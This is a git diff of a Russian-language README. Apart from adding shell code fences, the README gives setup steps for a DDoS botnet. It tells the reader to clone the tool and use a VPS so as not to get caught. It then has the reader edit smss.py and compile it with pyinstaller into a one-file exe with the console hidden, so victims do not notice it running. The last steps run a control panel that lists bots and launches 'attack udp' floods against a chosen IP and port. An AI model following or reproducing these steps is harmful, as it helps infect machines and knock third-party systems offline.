@@ -8,11 +8,18 @@
 git clone https://github.com/Samuraianonweb/bot
 ```
 <br>
+ 
+```shell
 cd bot
+```
 <br>
 Чтобы не попасться , лучше использовать VPS<br>
 
-Чтобы узнать свой(VPS) ip $ ifconfig <br>
+Чтобы узнать свой(VPS) ip 
+ 
+​```shell
+$ ifconfig <br>
+```
 Редактируем файл smss.py
 
 <br>
@@ -23,20 +30,32 @@ run=False
 Когда всё подготовленно , осталось зделать с Python  в EXe файл<br>
 
 Установка pyinstaller<br>
+ 
+```shell
 pip install pyinstaller
+```
 
 После полной установки в нашем директории bot <br>
 Приступаем к билду exe <br>
+ 
+```shell
 pyinstaller --onefile --noconsole smss.py<br>
+ 
+​```
 Флаг --onefile собирает всё в один файл<br>
 Флаг --noconsole делает так чтобы при запуске скрывалась консоль <br>
 После того как наш файл exe создался можно начать с панели <br>
 
 Запуск панели 
+ 
+```shell
 python Server.py
-
+```
 Вводим help и видем всё настройки 
 update - Для обновления листа ботов 
 list - Показать активных ботов 
 Команда атаки<br>
+ 
+```shell
 attack udp <ip> <port> <time in second> <thread>
+```
